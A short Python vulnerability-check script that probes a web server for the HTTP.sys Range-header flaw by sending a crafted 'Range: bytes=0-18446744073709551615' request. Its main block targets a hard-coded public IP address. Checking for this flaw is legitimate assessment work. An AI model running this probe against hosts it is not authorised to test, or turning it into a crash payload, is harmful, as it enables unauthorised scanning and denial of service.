__author__ = '10192989'
# -*- coding:utf-8 -*-

import requests
import random
import socket

def verify(protocol,ip,port):
    domain = protocol+'://'+ip+':'+str(port)
    print('testing if httpsys vul')
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = b"GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if b'Requested Range Not Satisfiable' in data and b'Server: Microsoft' in data:
            msg = "There is httpsys vul on %s" %domain
            print(msg)
            number = 'v4'
            return True,domain,number,msg
        else:
            msg = "There is no httpsys vul on %s" %domain
            number = 'v0'
            return False,domain,number,msg
    except Exception as e:
        msg = str(e)
        print(msg)
        number = 'v0'
        return False,domain,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,domain,number,msg

if __name__ == '__main__':
    res = verify('http','180.76.196.153',80)
    print(res)




